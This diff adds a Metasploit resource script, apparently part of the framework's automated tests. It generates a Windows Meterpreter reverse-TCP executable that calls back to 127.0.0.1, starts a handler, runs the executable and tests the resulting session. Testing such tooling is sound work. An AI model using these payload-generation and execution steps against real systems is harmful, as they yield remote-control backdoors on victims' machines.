@@ -1,0 +1,23 @@
+## Load test modules
+loadpath test/modules
+
+## Payload
+use windows/meterpreter/reverse_tcp
+
+## Set global datastore
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20231228-2128-m3qmsbtxt
+
+## Generate command
+generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20231228-2128-t1j6oo.exe -f exe AutoVerifySessionTimeout=30 lport=6002 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20231228-2128-2s7ivytxt MeterpreterDebugBuild=true
+
+## Create listener
+to_handler
+
+## Execute command
+D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20231228-2128-t1j6oo.exe
+
+
+## Replication commands
+use test/meterpreter
+run session=2 AddEntropy=true Verbose=true
